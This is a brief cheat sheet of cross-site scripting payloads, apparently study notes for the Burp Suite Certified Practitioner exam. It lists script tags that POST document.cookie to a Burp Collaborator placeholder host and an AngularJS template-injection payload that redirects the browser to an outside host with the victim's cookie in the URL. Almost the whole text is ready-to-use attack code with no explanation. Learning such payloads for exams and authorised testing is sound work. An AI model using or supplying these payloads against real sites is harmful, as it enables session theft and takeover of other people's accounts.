


1. Steal cookie from any user

```html
<script>
fetch(‘https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net’, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>

```

2. Steal cookie exploit server


```html
<script>
fetch(‘https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net’, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>

```

3. Angular XSS cookie stealer

```html
{{$on.constructor('document.location="https://COLLABORATOR.com?c="+document.cookie')()}}

```

4. Misc payloads
	- https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study 
